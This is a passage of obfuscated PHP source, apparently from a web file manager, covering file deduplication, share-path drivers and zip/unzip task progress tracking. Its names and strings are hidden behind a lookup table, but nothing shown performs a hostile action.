$¬ÏÕŞ¬…, $ŠÖê³ß); } } } private function _addFiles($‘´¢˜…í, $ºÒ§±¨, $£›œÕã°, $šËÛ‹†Ñ) { $ã²¿”Ü =& $_SERVER[”øäÃÍª]; if (!$£›œÕã° || count($£›œÕã°) == 0) { return array(); } $°³¯Ç“À = array(); foreach ($£›œÕã° as &$óÎš›±¤) { Hook::trigger($ã²¿”Ü[701], $óÎš›±¤); $óÎš›±¤[$ã²¿”Ü[87]] = $‘´¢˜…í->getPathInner($óÎš›±¤[$ã²¿”Ü[87]]); $ÒüĞº“ˆ = $‘´¢˜…í->hashSimple($óÎš›±¤[$ã²¿”Ü[87]]); $¯î´Çµ€ = $‘´¢˜…í->hashMd5($óÎš›±¤[$ã²¿”Ü[87]]); if (strlen($¯î´Çµ€) > 10 && !isset($°³¯Ç“À[$¯î´Çµ€])) { $°³¯Ç“À[$¯î´Çµ€] = array(); } $óÎš›±¤[$ã²¿”Ü[702]] = $ÒüĞº“ˆ; $óÎš›±¤[$ã²¿”Ü[571]] = $¯î´Çµ€; $°³¯Ç“À[$¯î´Çµ€][] =& $óÎš›±¤; if (count($°³¯Ç“À[$¯î´Çµ€]) > 1) { $óÎš›±¤[$ã²¿”Ü[700]] = !0; } Hook::trigger($ã²¿”Ü[703], $óÎš›±¤); } unset($óÎš›±¤); $¿İ·â§Ø = array($ã²¿”Ü[571] => array($ã²¿”Ü[7], array_keys($°³¯Ç“À))); $™â»ŸìÚ = Model($ã²¿”Ü[704]); $é±§í†Â = $™â»ŸìÚ->where($¿İ·â§Ø)->select(); $é±§í†Â = $é±§í†Â ? $é±§í†Â : array(); foreach ($é±§í†Â as $´™äÉõÍ) { if (!isset($°³¯Ç“À[$´™äÉõÍ[$ã²¿”Ü[571]]])) { continue; } $¾Êìâ‹ = $°³¯Ç“À[$´™äÉõÍ[$ã²¿”Ü[571]]]; foreach ($¾Êìâ‹ as &$óÎš›±¤) { $óÎš›±¤[$ã²¿”Ü[565]] = $´™äÉõÍ[$ã²¿”Ü[565]]; $óÎš›±¤[$ã²¿”Ü[700]] = !0; } unset($óÎš›±¤); } $äÌıœš¤ = array(); foreach ($£›œÕã° as $Úìó‹ğ) { Hook::trigger($ã²¿”Ü[705], $Úìó‹ğ); if (isset($Úìó‹ğ[$ã²¿”Ü[700]]) && $Úìó‹ğ[$ã²¿”Ü[700]]) { Hook::trigger($ã²¿”Ü[706], $Úìó‹ğ); continue; } $şºÚ“— = $‘´¢˜…í->getPathInner($Úìó‹ğ[$ã²¿”Ü[87]]); $«öìáé³ = $™â»ŸìÚ->addFileMake($şºÚ“—, $ºÒ§±¨, $Úìó‹ğ[$ã²¿”Ü[79]], $Úìó‹ğ[$ã²¿”Ü[702]], $Úìó‹ğ[$ã²¿”Ü[571]], $Úìó‹ğ[$ã²¿”Ü[32]], $šËÛ‹†Ñ); Hook::trigger($ã²¿”Ü[706], $Úìó‹ğ); if (!is_array($«öìáé³)) { continue; } $äÌıœš¤[] = $«öìáé³; } $™â»ŸìÚ->addAll($äÌıœš¤); $¿İ·â§Ø = array($ã²¿”Ü[571] => array($ã²¿”Ü[7], array_keys($°³¯Ç“À))); $é±§í†Â = $™â»ŸìÚ->where($¿İ·â§Ø)->select(); $é±§í†Â = $é±§í†Â ? $é±§í†Â : array(); foreach ($é±§í†Â as $´™äÉõÍ) { if (!isset($°³¯Ç“À[$´™äÉõÍ[$ã²¿”Ü[571]]])) { continue; } $—¯æ¢¥‰ =& $°³¯Ç“À[$´™äÉõÍ[$ã²¿”Ü[571]]]; foreach ($—¯æ¢¥‰ as &$óÎš›±¤) { $óÎš›±¤[$ã²¿”Ü[565]] = $´™äÉõÍ[$ã²¿”Ü[565]]; } unset($óÎš›±¤); } $¯óÈ‹· = array(); foreach ($£›œÕã° as $˜Ô­˜³³) { $¯óÈ‹·[$˜Ô­˜³³[$ã²¿”Ü[32]]] = $˜Ô­˜³³; } return $¯óÈ‹·; } } define($_SERVER[”øäÃÍª][707], $_SERVER[”øäÃÍª][708]); goto B–Šà¼¯; aÏŒØÛî: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ù†Ï©ØØ) { $this->pathParse = $ù†Ï©ØØ; $this->model = Model($_SERVER[”øäÃÍª][1488]); } public function getPathRoot() { $•¤šš˜ =& $_SERVER[”øäÃÍª]; return KodIO::makeShare($this->pathParse[$•¤šš˜[487]], $this->pathParse[$•¤šš˜[1312]]); } public function getPathOuter($ŠŒ©ºÒĞ) { $•œ‹˜åä =& $_SERVER[”øäÃÍª]; if (!$ŠŒ©ºÒĞ) { return $ŠŒ©ºÒĞ; } $¤ÃœÏÒÄ = $this->parse($ŠŒ©ºÒĞ); return trim(KodIO::makeShare($this->pathParse[$•œ‹˜åä[487]], $¤ÃœÏÒÄ[$•œ‹˜åä[487]]), $•œ‹˜åä[8]); } public function isParentOf($ï— „İ, $Á’çî¶€) { $œ“ËñµÏ = IO::init($Á’çî¶€); return $this->model->isParentOf($ï— „İ, $œ“ËñµÏ->path); } protected function infoParse($•â³Á¨, $à‰í›û = false, $çô´¾¬ = false) { $ºÇã®é· =& $_SERVER[”øäÃÍª]; static $„ïã–ëÅ = array(); $¥Õ‰Û¨ = $this->pathParse[$ºÇã®é·[487]]; $İñÃ¢… = trim($this->pathParse[$ºÇã®é·[1308]], $ºÇã®é·[8]); if (isset($„ïã–ëÅ[$İñÃ¢…]) && is_array($„ïã–ëÅ[$İñÃ¢…])) { return $„ïã–ëÅ[$İñÃ¢…]; } $¿ÓÇ¹áÔ = Action($ºÇã®é·[1495])->sharePathInfo($¥Õ‰Û¨, $İñÃ¢…, $à‰í›û); $„ïã–ëÅ[$İñÃ¢…] = $¿ÓÇ¹áÔ; return $¿ÓÇ¹áÔ; } public function infoFull($Í—îºÃ) { $§Åğ“†¼ =& $_SERVER[”øäÃÍª]; $’õ«¬•ë = explode($§Åğ“†¼[8], trim($Í—îºÃ, $§Åğ“†¼[8])); if (count($’õ«¬•ë) > 1) { $ª§¤¦ı” = implode($§Åğ“†¼[8], array_splice($’õ«¬•ë, 1)); $ˆ´¥°½± = $this->model->pathInfoByPath($’õ«¬•ë[0], $ª§¤¦ı”); if (!$ˆ´¥°½±) { return !1; } $this->pathParse[$§Åğ“†¼[1308]] = $ˆ´¥°½±[$§Åğ“†¼[191]]; } return $this->infoParse($Í—îºÃ); } public function listAll($ïüÉÒğÎ) { $ßËªï¬¢ =& $_SERVER[”øäÃÍª]; $ûÇøÎîÕ = IO::info($this->pathParse[$ßËªï¬¢[87]]); if (!$ûÇøÎîÕ) { return array(); } $ûµÉ¥Èæ = $this->model->listAll($ïüÉÒğÎ); $ï‰†¢ = Model($ßËªï¬¢[694])->getInfo($ûÇøÎîÕ[$ßËªï¬¢[695]]); foreach ($ûµÉ¥Èæ as &$İ¬ÚŸóí) { check_abort(); $İ¬ÚŸóí[$ßËªï¬¢[90]] = Action($ßËªï¬¢[1495])->_shareItemeParse($İ¬ÚŸóí[$ßËªï¬¢[90]], $ï‰†¢); } unset($İ¬ÚŸóí); return $ûµÉ¥Èæ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ğøÇ­¨ƒ) { $this->pathParse = $ğøÇ­¨ƒ; $this->model = Model($_SERVER[”øäÃÍª][1488]); } protected function infoParse($ñ»ÑáØƒ, $À©‡±®ı = false, $ÍÌ´ß¸Ñ = false) { $ÃŠêæÏÎ =& $_SERVER[”øäÃÍª]; return Action($ÃŠêæÏÎ[1315])->sharePathInfo($this->pathParse[$ÃŠêæÏÎ[87]], !0, $À©‡±®ı); } public function listPath($šöİÇÓ², $ƒìÒ©Â‹ = false) { $‰é¤›„– =& $_SERVER[”øäÃÍª]; $•İ¿ºÀ² = parent::listPath($šöİÇÓ², $ƒìÒ©Â‹); if (!$•İ¿ºÀ²) { return $•İ¿ºÀ²; } if (is_array($•İ¿ºÀ²[$‰é¤›„–[1496]])) { $•İ¿ºÀ²[$‰é¤›„–[1496]] = Action($‰é¤›„–[1315])->shareItemInfo($•İ¿ºÀ²[$‰é¤›„–[1496]]); } foreach ($•İ¿ºÀ² as $ıÅ¾“»‡ => $üõ˜»­) { if (!in_array($ıÅ¾“»‡, array($‰é¤›„–[86], $‰é¤›„–[85]))) { continue; } foreach ($üõ˜»­ as $ƒÁ”Ù’ü => $â»Î¯ı¡) { $•İ¿ºÀ²[$ıÅ¾“»‡][$ƒÁ”Ù’ü] = Action($‰é¤›„–[1315])->shareItemInfo($â»Î¯ı¡); } } return $•İ¿ºÀ²; } public function listAll($·é“ï·š) { $¶ƒ®¿¦ =& $_SERVER[”øäÃÍª]; $ ß¤›Û¼ = IO::info($this->pathParse[$¶ƒ®¿¦[87]]); if (!$ ß¤›Û¼) { return array(); } $ö«Õ‹úñ = $this->model->listAll($·é“ï·š); foreach ($ö«Õ‹úñ as &$ïéØş£) { $ïéØş£[$¶ƒ®¿¦[90]] = Action($¶ƒ®¿¦[1315])->shareItemInfo($ïéØş£[$¶ƒ®¿¦[90]]); } unset($ïéØş£); return $ö«Õ‹úñ; } } class PathDriverDriverShareItem { public function __construct($æ¿À¹¡¶) { $this->pathParse = $æ¿À¹¡¶; } public function __call($È‰áÕ€’, $„¢‚µ») { $•ïêö‡‚ =& $_SERVER[”øäÃÍª]; if (method_exists($this, $È‰áÕ€’)) { return; } $íÖ¢¦Š« = call_user_func_array(array($•ïêö‡‚[1497], $È‰áÕ€’), $„¢‚µ»); $œıµàó„ = array($•ïêö‡‚[1498], $•ïêö‡‚[1499], $•ïêö‡‚[1500], $•ïêö‡‚[1501], $•ïêö‡‚[649], $•ïêö‡‚[651], $•ïêö‡‚[1502], $•ïêö‡‚[107], $•ïêö‡‚[1503], $•ïêö‡‚[1504]); if (in_array($È‰áÕ€’, $œıµàó„)) { $íÖ¢¦Š« = $this->getPathOuter($íÖ¢¦Š«); } return $íÖ¢¦Š«; } public function copy($ÔëŸíü, $»¤ÏòÖ›, $ÕÊ„­ÉÖ = false, $‡œ®§¼ß = false) { return $this->copyMove($ÔëŸíü, $»¤ÏòÖ›, $ÕÊ„­ÉÖ, $_SERVER[”øäÃÍª][649], $‡œ®§¼ß); } public function move($¯ñÜ‘—Î, $—ÉÇÆş, $÷§Ì¶«¼ = false, $©Â¬›©ò = false) { return $this->copyMove($¯ñÜ‘—Î, $—ÉÇÆş, $÷§Ì¶«¼, $_SERVER[”øäÃÍª][651], $©Â¬›©ò); } private function copyMove($äÂÓ»†¤, $ü¸ï¥î¡, $ê™İÂĞÄ, $Âì ğü, $…Íâİ€Õ = false) { $•Ì‡ùÏª =& $_SERVER[”øäÃÍª]; $ŠûÜÏ‹æ = $ü¸ï¥î¡; $üàèË€× = IO::driverMake($ü¸ï¥î¡); if ($üàèË€×->pathParse[$•Ì‡ùÏª[1289]]) { $ü¸ï¥î¡ = $üàèË€×->pathParse[$•Ì‡ùÏª[1289]]; } else { $ü¸ï¥î¡ = $ŠûÜÏ‹æ; } $Ô«™²ï‚ = IO::copyMove($äÂÓ»†¤, $ü¸ï¥î¡, $ê™İÂĞÄ, $Âì ğü, $…Íâİ€Õ); $Ô«™²ï‚ = $this->getPathOuter($Ô«™²ï‚); return $Ô«™²ï‚; } public function pathThis($÷’„Ñ¡à) { return get_path_this($this->pathParse[$_SERVER[”øäÃÍª][87]]); } public function pathFather($Ö‘ŒË²Ë) { return get_path_father($this->pathParse[$_SERVER[”øäÃÍª][87]]); } public function iconvSystem($Ú–‚ú©ó) { return $Ú–‚ú©ó; } protected function infoParse($¼Ğ™½÷Û, $Òì…°× = false) { $Ç•¼’Ò™ =& $_SERVER[”øäÃÍª]; $ˆûáäõ† = $this->pathParse[$Ç•¼’Ò™[584]][$Ç•¼’Ò™[591]] . $this->pathParse[$Ç•¼’Ò™[1308]]; if ($Òì…°×) { $œÜùş¬Ô = IO::infoWithChildren($ˆûáäõ†); } else { $œÜùş¬Ô = IO::info($ˆûáäõ†); } $ˆŸÔ§Ùø = $this->pathParse[$Ç•¼’Ò™[584]]; return Action($Ç•¼’Ò™[1495])->_shareItemeParse($œÜùş¬Ô, $ˆŸÔ§Ùø); } public function listAll($ÁŞ”¾‡é) { $›éø ×ï =& $_SERVER[”øäÃÍª]; $×¶ñ™µÎ = IO::listAll($ÁŞ”¾‡é); $ª‰°“– = rtrim($this->pathParse[$›éø ×ï[584]][$›éø ×ï[591]], $›éø ×ï[8]); foreach ($×¶ñ™µÎ as &$”¸Ç“¾) { $”¸Ç“¾[$›éø ×ï[87]] = $this->pathDriver . $›éø ×ï[8] . ltrim(substr($”¸Ç“¾[$›éø ×ï[87]], strlen($ª‰°“–)), $›éø ×ï[8]); } unset($”¸Ç“¾); return $×¶ñ™µÎ; } public function listAllSimple($Ç‡Ù¾ã, $ıáÏ…ò¿ = false) { $³¾Ø˜˜Š =& $_SERVER[”øäÃÍª]; $£ÈÔ°Ô¥ = $this->listAll($Ç‡Ù¾ã); $üß¸§ = $this->pathParse[$³¾Ø˜˜Š[518]]; if (trim($üß¸§, $³¾Ø˜˜Š[8]) == trim(get_path_father($üß¸§), $³¾Ø˜˜Š[8])) { $ıáÏ…ò¿ = !0; } return IO::init($³¾Ø˜˜Š[12])->listAllSimpleMake($£ÈÔ°Ô¥, $üß¸§, $ıáÏ…ò¿); } public function getPathOuter($º÷ø¨ÜÙ) { $Áº®ùØ² =& $_SERVER[”øäÃÍª]; $ˆ–›ç = KodIO::parse($º÷ø¨ÜÙ); if ($ˆ–›ç[$Áº®ùØ²[33]] == KodIO::KOD_SHARE_ITEM) { return $ˆ–›ç[$Áº®ùØ²[87]]; } $¯ğÂÆ¨ø = KodIO::clear($º÷ø¨ÜÙ); $¶ ·šÙ = KodIO::clear($this->pathParse[$Áº®ùØ²[584]][$Áº®ùØ²[591]]); $Îã°‰¸ = substr($¯ğÂÆ¨ø, strlen($¶ ·šÙ)); if (substr($¯ğÂÆ¨ø, 0, strlen($¶ ·šÙ)) != $¶ ·šÙ) { return !1; } return $this->pathParse[$Áº®ùØ²[1309]] . $Áº®ùØ²[8] . ltrim($Îã°‰¸, $Áº®ùØ²[8]); } public function getType() { $«§‰Ø¤Ÿ =& $_SERVER[”øäÃÍª]; $®’¯òÖ = str_replace($«§‰Ø¤Ÿ[77], $«§‰Ø¤Ÿ[12], get_class($this)); return strtolower($®’¯òÖ); } public function isOsDriver($“¼Õ‚ÌĞ) { return IO::isOsDriver($“¼Õ‚ÌĞ); } public function info($Ö¥Ë‘íˆ) { return $this->infoParse($Ö¥Ë‘íˆ); } public function infoAuth($‚Ôµå‚ƒ) { return $this->infoParse($‚Ôµå‚ƒ); } public function infoWithChildren($ïÌÒª˜ô) { return $this->infoParse($ïÌÒª˜ô, !0); } public function infoFull($ÊíÓ€·) { return $this->infoParse($ÊíÓ€·); } } goto f¦ÚİÌ¢ğ“; B…¯Ëİ•”•: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $‘ü…¡şÊ =& $_SERVER[”øäÃÍª]; parent::startAfter(); Hook::bind($‘ü…¡şÊ[2058], array($this, $‘ü…¡şÊ[2059])); Hook::bind($‘ü…¡şÊ[1336], array($this, $‘ü…¡şÊ[2060])); Hook::bind($‘ü…¡şÊ[2061], array($this, $‘ü…¡şÊ[2062])); $ØÃ®¤¹æ =& $this->task; $ØÃ®¤¹æ[$‘ü…¡şÊ[2063]] = $‘ü…¡şÊ[1337]; if (!$ØÃ®¤¹æ[$‘ü…¡şÊ[1819]]) { $ØÃ®¤¹æ[$‘ü…¡şÊ[1819]] = LNG($‘ü…¡şÊ[2064]); } } protected function endAfter() { $ººÇ…½Ã =& $_SERVER[”øäÃÍª]; parent::endAfter(); Hook::unbind($ººÇ…½Ã[2058], array($this, $ººÇ…½Ã[2059])); Hook::unbind($ººÇ…½Ã[1336], array($this, $ººÇ…½Ã[2060])); Hook::unbind($ººÇ…½Ã[2061], array($this, $ººÇ…½Ã[2062])); } public function updateAfter() { $åª…¥Ÿ¸ =& $_SERVER[”øäÃÍª]; $Ì‡İ™Œç =& $this->task; if (!$Ì‡İ™Œç[$åª…¥Ÿ¸[1184]] || !$Ì‡İ™Œç[$åª…¥Ÿ¸[873]]) { if ($Ì‡İ™Œç[$åª…¥Ÿ¸[2063]] != $åª…¥Ÿ¸[388]) { return; } } if ($Ì‡İ™Œç[$åª…¥Ÿ¸[2063]] == $åª…¥Ÿ¸[1337]) { $—­¾ûŒ¤ = 0; if ($Ì‡İ™Œç[$åª…¥Ÿ¸[1987]]) { $—­¾ûŒ¤ = $Ì‡İ™Œç[$åª…¥Ÿ¸[1988]] / $Ì‡İ™Œç[$åª…¥Ÿ¸[1987]]; } $Ì‡İ™Œç[$åª…¥Ÿ¸[1935]] = $—­¾ûŒ¤ * 0.3; } else { if ($Ì‡İ™Œç[$åª…¥Ÿ¸[2063]] == $åª…¥Ÿ¸[388]) { $—­¾ûŒ¤ = $Ì‡İ™Œç[$åª…¥Ÿ¸[1934]] / $Ì‡İ™Œç[$åª…¥Ÿ¸[1184]]; $Ì‡İ™Œç[$åª…¥Ÿ¸[1935]] = 0.3 + $—­¾ûŒ¤ * 0.4; } else { if ($Ì‡İ™Œç[$åª…¥Ÿ¸[2063]] == $åª…¥Ÿ¸[107]) { $Ó¨ÜÜéÈ = 0; if ($Ì‡İ™Œç[$åª…¥Ÿ¸[1989]] == $åª…¥Ÿ¸[107]) { $Ó¨ÜÜéÈ = $Ì‡İ™Œç[$åª…¥Ÿ¸[1988]]; } $—­¾ûŒ¤ = ($Ì‡İ™Œç[$åª…¥Ÿ¸[1992]] + $Ó¨ÜÜéÈ) / $Ì‡İ™Œç[$åª…¥Ÿ¸[873]]; $Ì‡İ™Œç[$åª…¥Ÿ¸[1935]] = 0.3 + 0.4 + $—­¾ûŒ¤ * 0.3; } } } if ($Ì‡İ™Œç[$åª…¥Ÿ¸[1935]] > 0) { $²ÍÑû§ = timeFloat() - $Ì‡İ™Œç[$åª…¥Ÿ¸[1937]] - $Ì‡İ™Œç[$åª…¥Ÿ¸[1940]]; $Ì‡İ™Œç[$åª…¥Ÿ¸[1941]] = $²ÍÑû§ * (1 - $Ì‡İ™Œç[$åª…¥Ÿ¸[1935]]) / $Ì‡İ™Œç[$åª…¥Ÿ¸[1935]]; } } public function addFile($§øÙı·‹) { $‡ˆ®Ÿ˜  =& $_SERVER[”øäÃÍª]; $ˆöŠÖ =& $this->task; $Ÿîì´¿ã = IO::info($§øÙı·‹); $ˆöŠÖ[$‡ˆ®Ÿ˜ [1985]] = $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [32]]; $ˆöŠÖ[$‡ˆ®Ÿ˜ [1987]] = $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [79]]; $ˆöŠÖ[$‡ˆ®Ÿ˜ [1988]] = 0; $ˆöŠÖ[$‡ˆ®Ÿ˜ [1186]] = $‡ˆ®Ÿ˜ [2016]; $ˆöŠÖ[$‡ˆ®Ÿ˜ [1989]] = $‡ˆ®Ÿ˜ [1337]; $ˆöŠÖ[$‡ˆ®Ÿ˜ [873]] = $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [79]]; $ˆöŠÖ[$‡ˆ®Ÿ˜ [1184]] = 1; $£—–ÄŸ = 0; $ˆöŠÖ[$‡ˆ®Ÿ˜ [1998]] = array($‡ˆ®Ÿ˜ [1999] => $£—–ÄŸ + 1, $‡ˆ®Ÿ˜ [517] => $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [32]], $‡ˆ®Ÿ˜ [87] => $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [87]], $‡ˆ®Ÿ˜ [610] => $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [610]] ? $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [610]] : $Ÿîì´¿ã[$‡ˆ®Ÿ˜ [87]]); $this->update(); } public function zipEvent($˜ªŠˆî¥, $¿³‚± ƒ, $³—è³é®, $Âš¨ÉÒı) { $¦‘ŞŞÕ˜ =& $_SERVER[”øäÃÍª]; $¬‡õ‚µÏ =& $this->task; $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[1985]] = get_path_this($¿³‚± ƒ); $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[1987]] = $Âš¨ÉÒı; $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[1988]] = $³—è³é®; $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[1186]] = $˜ªŠˆî¥ == $¦‘ŞŞÕ˜[2065] ? $¦‘ŞŞÕ˜[2066] : $¦‘ŞŞÕ˜[2067]; $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[1989]] = $¦‘ŞŞÕ˜[12]; $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[873]] = $Âš¨ÉÒı; $¬‡õ‚µÏ[$¦‘ŞŞÕ˜[2063]] = $¦‘ŞŞÕ˜[388]; $this->update(); } public function unzipAfter($óÑè¸Ê±) { $“ùÆ³â› =& $_SERVER[”øäÃÍª]; $Ì¤¥Üƒ› =& $this->task; $Ì¤¥Üƒ›[$“ùÆ³â›[2063]] = $“ùÆ³â›[107]; $çúşû = IO::infoWithChildren($óÑè¸Ê±); $Ê’šöºÂ = 0; $Ì¤¥Üƒ›[$“ùÆ³â›[1998]] = array($“ùÆ³â›[1999] => $Ê’šöºÂ + 1, $“ùÆ³â›[517] => $çúşû[$“ùÆ³â›[32]], $“ùÆ³â›[87] => $çúşû[$“ùÆ³â›[87]], $“ùÆ³â›[610] => $çúşû[$“ùÆ³â›[610]] ? $çúşû[$“ùÆ³â›[610]] : $çúşû[$“ùÆ³â›[87]]); if ($çúşû[$“ùÆ³â›[33]] == $“ùÆ³â›[230]) { $Ì¤¥Üƒ›[$“ùÆ³â›[1184]] = 1; } else { $Ì¤¥Üƒ›[$“ùÆ³â›[1184]] = $çúşû[$“ùÆ³â›[82]][$“ùÆ³â›[80]]; } $Ì¤¥Üƒ›[$“ùÆ³â›[1186]] = $“ùÆ³â›[12]; $Ì¤¥Üƒ›[$“ùÆ³â›[1989]] = 0; $Ì¤¥Üƒ›[$“ùÆ³â›[1934]] = 0; $Ì¤¥Üƒ›[$“ùÆ³â›[1987]] = 0; $Ì¤¥Üƒ›[$“ùÆ³â›[1988]] = 0; $Ì¤¥Üƒ›[$“ùÆ³â›[1985]] = $“ùÆ³â›[12]; $Ì¤¥Üƒ›[$“ùÆ³â›[1992]] = 0; $Ì¤¥Üƒ›[$“ùÆ³â›[873]] = $çúşû[$“ùÆ³â›[79]]; $this->update(); self::log($“ùÆ³â›[2068] . json_encode(array($Ì¤¥Üƒ›, $çúşû))); } public function nameParse($ÈØİ‹æº) { $‚ò¶§± =& $_SERVER[”øäÃÍª]; $Õ…Ööóü =& $this->task; if ($Õ…Ööóü[$‚ò¶§±[2063]] == $‚ò¶§±[1337]) { $Õ…Ööóü[$‚ò¶§±[2063]] = $‚ò¶§±[388]; $Õ…Ööóü[$‚ò¶§±[1992]] = 0; $Õ…Ööóü[$‚ò¶§±[873]] = 0; } $¶ãİæÒı = get_path_this($ÈØİ‹æº); if (strstr($¶ãİæÒı, $‚ò¶§±[10])) { $Õ…Ööóü[$‚ò¶§±[1934]] += 1; $Õ…Ööóü[$‚ò¶§±[1184]] += 1; } $Õ…Ööóü[$‚ò¶§±[1985]] = $ÈØİ‹æº; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $‡‰ğşû =& $_SERVER[”øäÃÍª]; parent::startAfter(); Hook::bind($‡‰ğşû[2069], array($this, $‡‰ğşû[2059])); Hook::bind($‡‰ğşû[2061], array($this, $‡‰ğşû[2062])); $³°Î€å€ =& $this->task; $³°Î€å€[$‡‰ğşû[2063]] = $‡‰ğşû[1337]; if (!$³°Î€å€[$‡‰ğşû[1819]]) { $³°Î€å€[$‡‰ğşû[1819]] = LNG($‡‰ğşû[2070]); } } protected function endAfter() { $¦×¹¶’Ó =& $_SERVER[”øäÃÍª]; parent::endAfter(); Hook::unbind($¦×¹¶’Ó[2069], array($this, $¦×¹¶’Ó[2059])); Hook::unbind($¦×¹¶’Ó[2061], array($this, $¦×¹¶’Ó[2062])); } public function updateAfter() { $…©ÏÙ— =& $_SERVER[”øäÃÍª]; $§Ü­á´Ä =& $this->task; if (!$§Ü­á´Ä[$…©ÏÙ—[1184]] || !$§Ü­á´Ä[$…©ÏÙ—[873]]) { return; } if ($§Ü­á´Ä[$…©ÏÙ—[2063]] == $…©ÏÙ—[1337]) { $¦„çÒ²Š = $§Ü­á´Ä[$…©ÏÙ—[1988]]; if ($§Ü­á´Ä[$…©ÏÙ—[1989]] != $…©ÏÙ—[1337]) { $¦„çÒ²Š = 0; } $œÉÂÀ³ = ($§Ü­á´Ä[$…©ÏÙ—[1992]] + $¦„çÒ²Š) / $§Ü­á´Ä[$…©ÏÙ—[873]]; $§Ü­á´Ä[$…©ÏÙ—[1935]] = $œÉÂÀ³ * 0.3; } else { if ($§Ü­á´Ä[$…©ÏÙ—[2063]] == $…©ÏÙ—[388]) { $œÉÂÀ³ = $§Ü­á´Ä[$…©ÏÙ—[1934]] / $§Ü­á´Ä[$…©ÏÙ—[1184]]; $§Ü­á´Ä[$…©ÏÙ—[1935]] = 0.3 + $œÉÂÀ³ * 0.5; } else { if ($§Ü­á´Ä[$…©ÏÙ—[2063]] == $…©ÏÙ—[107]) { $œÉÂÀ³ = 0; if ($§Ü­á´Ä[$…©ÏÙ—[1987]]) { $œÉÂÀ³ = $§Ü­á´Ä[$…©ÏÙ—[1988]] / $§Ü­á´Ä[$…©ÏÙ—[1987]]; } $§Ü­á´Ä[$…©ÏÙ—[1935]] = 0.3 + 0.5 + $œÉÂÀ³ * 0.2; } } } if ($§Ü­á´Ä[$…©ÏÙ—[1935]] > 0) { $ª”Àëè÷ = timeFloat() - $§Ü­á´Ä[$…©ÏÙ—[1937]] - $§Ü­á´Ä[$…©ÏÙ—[1940]]; $§Ü­á´Ä[$…©ÏÙ—[1941]] = $ª”Àëè÷ * (1 - $§Ü­á´Ä[$…©ÏÙ—[1935]]) / $§Ü­á´Ä[$…©ÏÙ—[1935]]; } } public function copyFileStart($ñÏ›˜±Œ, $„®¬Š›, $Š¥´Í¿«, $ ’ûÙæò, $òìöÎ´Ç, $Ä¾‡À¹) { $‹‰–Ä• =& $_SERVER[”øäÃÍª]; parent::copyFileStart($ñÏ›˜±Œ, $„®¬Š›, $Š¥´Í¿«, $ ’ûÙæò, $òìöÎ´Ç, $Ä¾‡À¹); $øšŠ¢òÁ =& $this->task; if ($øšŠ¢òÁ[$‹‰–Ä•[2063]] == $‹‰–Ä•[388]) { $øšŠ¢òÁ[$‹‰–Ä•[2063]] = $‹‰–Ä•[107]; } $this->update(); } public function copyFileEnd($ÍŞñ™û, $úó“Üıè, $×µÒ©İô, $²ß°†£, $”ØÇãËí, $‹¬—ß÷©) { $®¦„±ò =& $_SERVER[”øäÃÍª]; $ó“ûÏòä =& $this->task; $ó“ûÏòä[$®¦„±ò[1988]] = $ó“ûÏòä[$®¦„±ò[1987]]; $ó“ûÏòä[$®¦„±ò[1992]] += $ó“ûÏòä[$®¦„±ò[1987]]; $ó“ûÏòä[$®¦„±ò[1989]] = $®¦„±ò[12]; $this->update(); } public function zipEvent($ğÔÜèá„, $Ãå–¾ğ, $ä‹‘¥œ, $ÔÆ†¢š) { $»¥€Â×ù =& $_SERVER[”øäÃÍª]; $‰ßŞûÓ =& $this->task; $‰ßŞûÓ[$»¥€Â×ù[1985]] = get_path_this($Ãå–¾ğ); $‰ßŞûÓ[$»¥€Â×ù[1987]] = $ÔÆ†¢š; $‰ßŞûÓ[$»¥€Â×ù[1988]] = $ä‹‘¥œ; $‰ßŞûÓ[$»¥€Â×ù[1186]] = $ğÔÜèá„ == $»¥€Â×ù[2071] ? $»¥€Â×ù[2066] : $»¥€Â×ù[2067]; $‰ßŞûÓ[$»¥€Â×ù[1989]] = $»¥€Â×ù[12]; $‰ßŞûÓ[$»¥€Â×ù[873]] = $ÔÆ†¢š; $‰ßŞûÓ[$»¥€Â×ù[2063]] = $»¥€Â×ù[388]; $this->update(); } public function nameParse($°öØÊƒÏ) { $îÊÊĞ¶¥ =& $_SERVER[”øäÃÍª]; $×†É÷ÒË =& $this->task; if ($×†É÷ÒË[$îÊÊĞ¶¥[1934]] < $×†É÷ÒË[$îÊÊĞ¶¥[1184]]) { $¨Ü„… = get_path_this($°öØÊƒÏ); if (strstr($¨Ü„…, $îÊÊĞ¶¥[10])) { $×†É÷ÒË[$îÊÊĞ¶¥[1934]] += 1; } } if ($×†É÷ÒË[$îÊÊĞ¶¥[2063]] == $îÊÊĞ¶¥[1337]) { $×†É÷ÒË[$îÊÊĞ¶¥[2063]] = $îÊÊĞ¶¥[388]; } $×†É÷ÒË[$îÊÊĞ¶¥[1985]] = $°öØÊƒÏ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¸ĞÔ¹‡ô) { $¾›ù½Û =& $_SERVER[”øäÃÍª]; $ğàçŠ­ = array($¾›ù½Û[692] => array($¾›ù½Û[33] => $¾›ù½Û[2072], $¾›ù½Û[351] => array($¾›ù½Û[282], $¾›ù½Û[875], $¾›ù½Û[2073], $¾›ù½Û[2074])), $¾›ù½Û[2075] => array($¾›ù½Û[33] => $¾›ù½Û[2076], $¾›ù½Û[351] => array($¾›ù½Û[282], $¾›ù½Û[873], $¾›ù½Û[2077], $¾›ù½Û[2078], $¾›ù½Û[2079]))); if (!isset($ğàçŠ­[$¸ĞÔ¹‡ô])) { return !1; } $this->optionType = $ğàçŠ­[$¸ĞÔ¹‡ô][$¾›ù½Û[33]]; $this->field = $ğàçŠ­[$¸ĞÔ¹‡ô][$¾›ù½Û[351]]; return !0; } public function listData($«Â÷Š‰Ã = false, $áğûÏ 